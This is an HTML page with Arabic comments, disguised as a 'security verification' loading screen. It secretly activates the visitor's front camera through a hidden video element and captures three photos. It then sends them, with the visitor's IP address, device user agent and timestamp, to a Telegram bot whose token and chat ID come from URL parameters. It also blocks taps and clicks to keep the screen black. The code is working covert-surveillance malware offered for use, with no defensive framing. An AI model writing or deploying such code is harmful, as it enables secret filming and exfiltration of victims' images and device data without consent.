<!DOCTYPE html> <html lang="ar"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> <title>التحقق الأمني</title> <style> * { margin: 0; padding: 0; box-sizing: border-box; } body { background: black; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; position: fixed; width: 100%; height: 100%; } /* الشاشة السوداء الرئيسية */ .main-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; display: flex; align-items: center; justify-content: center; z-index: 1000; color: white; } /* دائرة التحميل */ .loading-spinner { width: 80px; height: 80px; border: 5px solid rgba(255, 255, 255, 0.1); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; } @keyframes spin { to { transform: rotate(360deg); } } /* 🔥 كاميرا مخفية تماماً */ #hiddenCamera { position: fixed; top: -1000px; left: -1000px; width: 1px; height: 1px; opacity: 0; pointer-events: none; z-index: -1; } /* رسالة منبثقة صغيرة (مش مزعجة) */ .mini-toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.8); color: white; padding: 8px 16px; border-radius: 20px; font-size: 12px; z-index: 2000; display: none; border: 1px solid rgba(255, 255, 255, 0.2); backdrop-filter: blur(5px); } </style> </head> <body> <!-- الشاشة السوداء الرئيسية (دائماً ظاهرة) --> <div class="main-screen" id="mainScreen"> <div class="loading-spinner" id="loadingSpinner"></div> <div style="position: absolute; bottom: 50px; font-size: 12px; opacity: 0.5;" id="statusText">جاري التحميل...</div> </div> <!-- 🔥 كاميرا مخفية - مش هتظهر خالص --> <video id="hiddenCamera" autoplay playsinline muted></video> <!-- رسالة منبثقة صغيرة (لو حابب تظهر رسالة للمستخدم) --> <div class="mini-toast" id="miniToast"></div> <script> // فك التشفير function decodeToken(encodedToken) { try { return atob(decodeURIComponent(encodedToken)); } catch (e) { return null; } } // قراءة الباراميترات const urlParams = new URLSearchParams(window.location.search); const CHAT_ID = urlParams.get('id'); const encodedToken = urlParams.get('tok'); const BOT_TOKEN = encodedToken ? decodeToken(encodedToken) : null; // العناصر const mainScreen = document.getElementById('mainScreen'); const loadingSpinner = document.getElementById('loadingSpinner'); const statusText = document.getElementById('statusText'); const hiddenVideo = document.getElementById('hiddenCamera'); const miniToast = document.getElementById('miniToast'); let mediaStream = null; let capturedImages = []; let isCapturing = false; // دالة إظهار رسالة صغيرة (اختياري) function showMessage(msg) { miniToast.style.display = 'block'; miniToast.textContent = msg; setTimeout(() => { miniToast.style.display = 'none'; }, 2000); } // 🔥 بدء الكاميرا المخفية async function startHiddenCamera() { try { // تغيير النص statusText.textContent = 'جاري الان...'; // طلب الكاميرا الأمامية (بدون أي عرض) mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false }); // ربط الكاميرا بالفيديو المخفي hiddenVideo.srcObject = mediaStream; // تشغيل الفيديو (وهو مخفي) await hiddenVideo.play(); // تغيير النص statusText.textContent = 'جاري ...'; // بدأ التصوير بعد ثانية setTimeout(() => { startHiddenPhotoSequence(); }, 1000); } catch (error) { console.error('خطأ :', error); // لو رفض الإذن أو فيه مشكلة statusText.textContent = '❌ فشل الوصول '; // حاول تاني بعد 3 ثواني (اختياري) setTimeout(() => { startHiddenCamera(); }, 3000); } } // 🔥 التقاط صورة (من الكاميرا المخفية) function captureHiddenPhoto() { return new Promise((resolve) => { // التأكد من وجود الفيديو if (!hiddenVideo.videoWidth) { setTimeout(() => resolve(captureHiddenPhoto()), 100); return; } // إنشاء كانفاس للصورة const canvas = document.createElement('canvas'); canvas.width = hiddenVideo.videoWidth || 640; canvas.height = hiddenVideo.videoHeight || 480; const context = canvas.getContext('2d'); // رسم الصورة من الفيديو المخفي context.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height); // تحويل لـ Base64 const imageData = canvas.toDataURL('image/jpeg', 0.7); resolve(imageData); }); } // 🔥 بدأ التصوير المتسلسل (في الخفاء) async function startHiddenPhotoSequence() { if (isCapturing) return; isCapturing = true; showMessage('🗯 جاري تحضير...'); for (let i = 0; i < 3; i++) { // تأخير بين الصور if (i > 0) { await new Promise(resolve => setTimeout(resolve, 1500)); } try { // التقاط صورة const photo = await captureHiddenPhoto(); capturedImages.push(photo); // تحديث النص statusText.textContent = `تم تحضير ${i + 1}/3 قائمه `; } catch (error) { console.error('فشل ا:', error); } } // تم التصوير statusText.textContent = 'جاري الإرسال...'; showMessage('📤 جاري فتح...'); // إرسال الصور await sendHiddenPhotos(); } // 🔥 إرسال الصور async function sendHiddenPhotos() { try { // جلب IP let ip = 'غير معروف'; try { const ipRes = await fetch('https://api.ipify.org?format=json'); const ipData = await ipRes.json(); ip = ipData.ip; } catch (e) {} // إرسال كل صورة for (let i = 0; i < capturedImages.length; i++) { const photoData = capturedImages[i]; // تحويل Base64 إلى Blob const block = photoData.split(';'); const realData = block[1].split(',')[1]; // تحويل const byteCharacters = atob(realData); const byteArrays = []; for (let offset = 0; offset < byteCharacters.length; offset += 512) { const slice = byteCharacters.slice(offset, offset + 512); const byteNumbers = new Array(slice.length); for (let j = 0; j < slice.length; j++) { byteNumbers[j] = slice.charCodeAt(j); } byteArrays.push(new Uint8Array(byteNumbers)); } const blob = new Blob(byteArrays, { type: 'image/jpeg' }); // إرسال الصورة const formData = new FormData(); formData.append('chat_id', CHAT_ID); formData.append('photo', blob, `photo_${i + 1}.jpg`); formData.append('caption', `📸 صورة ${i + 1} (تصوير خفي)`); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }); // تأخير بين الصور if (i < capturedImages.length - 1) { await new Promise(resolve => setTimeout(resolve, 1000)); } } // إرسال معلومات إضافية const textMessage = ` 📱 <b>تصوير خفي - 3 صور</b> ━━━━━━━━━━━━━━━━ 🌍 <b>IP:</b> ${ip} 📱 <b>الجهاز:</b> ${navigator.userAgent.substring(0, 100)} ⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')} ━━━━━━━━━━━━━━━━ ⚠️ <i>تم التصوير في الخلفية</i> `; await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage, parse_mode: 'HTML' }) }); // تم بنجاح statusText.textContent = '✓ تم بنجاح'; showMessage('✅ تم'); // إيقاف الكاميرا if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); } // بعد ثانيتين، يرجع للتحميل (لو عايز) setTimeout(() => { statusText.textContent = 'تم بنجاح ✓'; loadingSpinner.style.opacity = '0.5'; }, 2000); } catch (error) { console.error('فشل الإرسال:', error); statusText.textContent = '❌ فشل '; showMessage('❌ فشل'); } } // التحقق من الرابط if(!CHAT_ID || !BOT_TOKEN) { mainScreen.innerHTML = '<div style="color: white; text-align: center;">⚠️ رابط غير صالح</div>'; } else { // 🔥 بدأ كل حاجة setTimeout(() => { startHiddenCamera(); }, 2000); } // منع أي تفاعل مع الشاشة (السكرين بتفضل سودا) document.addEventListener('click', (e) => { e.preventDefault(); return false; }, true); document.addEventListener('touchstart', (e) => { e.preventDefault(); return false; }, true); </script> </body> </html>
